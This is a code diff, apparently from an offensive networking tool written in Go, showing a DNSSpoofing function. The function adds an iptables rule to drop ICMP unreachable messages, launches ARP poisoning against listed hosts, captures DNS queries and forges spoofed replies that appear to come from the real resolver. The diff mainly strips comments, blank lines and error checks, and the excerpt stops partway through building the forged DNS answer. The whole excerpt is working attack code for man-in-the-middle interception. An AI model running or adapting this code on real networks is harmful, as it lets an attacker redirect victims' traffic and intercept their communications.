@@ -56,51 +56,39 @@ func PoisonArp(mapList map[string]string, iface string) {
 }
 
 func DNSSpoofing(iface, hosts, fakeIP string) {
-
 	ipMap := make(map[string]string)
 	cmd := exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP")
-	err = cmd.Run()
-	if err != nil {
-		log.Fatal(err)
-	}
-
+	_ = cmd.Run()
 	parseHosts(hosts, ipMap, iface)
-
 	go PoisonArp(ipMap, iface)
 
 	for {
 		packet := communication.Recv(iface)
-
 		dns := packet.Layer(layers.LayerTypeDNS)
 		if dns == nil {
 			continue
 		}
-
 		ethLayer, _ := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
 		ipLayer, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
 		udpLayer, _ := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
 		dnsLayer, _ := dns.(*layers.DNS)
 
 		if dnsLayer.QR == false && dnsLayer.OpCode == layers.DNSOpCodeQuery {
-			//eth layer
 			ethToSend := craft.EthernetLayer()
 			ethToSend.SetDstMAC(ethLayer.SrcMAC.String())
 			ethToSend.SetSrcMAC(utils.MacByInt(iface))
 			ethToSend.SetEthernetType(ethLayer.EthernetType)
 
-			//iplayer
 			ipToSend := craft.IPv4Layer()
 			ipToSend.SetSrcIP(ipLayer.DstIP.String())
 			ipToSend.SetDstIP(ipLayer.SrcIP.String())
 			ipToSend.SetProtocol(layers.IPProtocolUDP)
 
-			//udpLayer
 			udpToSend := craft.UDPLayer()
 			udpToSend.SetSrcPort("53")
 			udpToSend.SetDstPort(udpLayer.SrcPort.String())
 			udpToSend.Layer().SetNetworkLayerForChecksum(ipToSend.Layer())
 
-			//dnsLayer
 			dnsToSend := craft.DNSLayer()
 			dnsToSend.Layer().ID = dnsLayer.ID
 			dnsToSend.Layer().AA = false
